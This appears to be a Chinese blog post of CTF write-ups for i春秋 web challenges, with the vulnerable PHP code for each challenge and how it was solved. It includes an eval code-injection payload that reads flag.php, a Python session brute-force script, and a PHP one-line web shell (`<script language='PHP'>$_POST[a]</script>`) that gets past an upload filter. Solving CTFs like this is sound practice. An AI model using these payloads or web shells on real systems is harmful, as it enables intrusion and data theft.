---
title: i春秋-CTF-Write-Up
date: 2018-03-23 20:53:29
categories: Write Up
tags:
 - ctf
 - wp
description:
---
记录在i春秋中的艰辛历史...
[i春秋CTF大本营](https://www.ichunqiu.com/battalion)
<!-- more -->
### 爆破-1
```php
include "flag.php";
$a = @$_REQUEST['hello'];
if(!preg_match('/^\w*$/',$a )){
  die('ERROR');
}
eval("var_dump($$a);");
show_source(__FILE__);
```
进入页面看见代码，正则过滤死了，只能输入英文字母和下划线。所以不能拼接字符串失败进行代码注入。
就可以尝试猜测变量，来获取想要看的内容。
直接传递`hello=flag`试试，发现提示`flag在一个长度为6的变量里面`。这样的话除非是纯数字，不然很不好爆破。
然后想到`$GLOBALS`，可以打印出所有全局变量。
尝试`hello=GLOBALS`。得到flag

<br>
### 爆破-2

```php
include "flag.php";
$a = @$_REQUEST['hello'];
eval( "var_dump($a);");
show_source(__FILE__);
```
没有正则过滤，直接拼接字符串就可以实现代码注入。
`hello=);print_r(file('flag.php')`，最后凭借的结果就是`eval( "var_dump(hello=);print_r(file('flag.php'));");`
直接打印`flag.php`的内容。




### 爆破-3
```php
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}
// 2分钟会销毁Session
if($_SESSION['time']+120<time()){
  session_destroy();
}

$value = $_REQUEST['value'];
// 创建a-z的数组
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];

// md5函数传入的是一个数组，所以返回为NULL，NULL==0  返回true
if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands; // 注意这，他把第二次随机的值输出了，所以我们可以拿到这个值去来作为下次提交参数
}

if($_SESSION['nums']>=10){
  echo $flag;
}

show_source(__FILE__);
```
根据代码审计分析，最后写出爆破脚本(手工也是可以的)
```python
import requests


s = requests.Session()
url = "http://844c147e18614b3faab54a4662ac7776e86ece97eaf44f07.game.ichunqiu.com/?value[]=ea"
content = s.get(url).text
for i in range(11):
    url = "http://844c147e18614b3faab54a4662ac7776e86ece97eaf44f07.game.ichunqiu.com/?value[]={0}"
    url = url.format(content[0:2])
    content = s.get(url).text
    print(content)
```




<br>

### Upload
进入页面是一个上传界面，然后大概看下，直接上传一个正常的文件，发现上传成功。
并且页面中会返回你上传到哪里的链接，但是放很猥琐的(所以我开始没找到)

那么直接上传一个PHP看下有没有限制，发现直接上传成功。
但是访问的时候内容被过滤了。过滤了`<?`和`php`利用重写无法绕过，但是可以大小写PHP来达到绕过条件。
那么`<?`在利用一种其他的方式来代替`<script language='PHP'></script>`同样也可以
那么写入自己的一句话，最后的payload为`<script language='PHP'>$_POST[a]</script>`
菜刀连接，得到flag

<br>

### 1


<br>

### 1


<br>
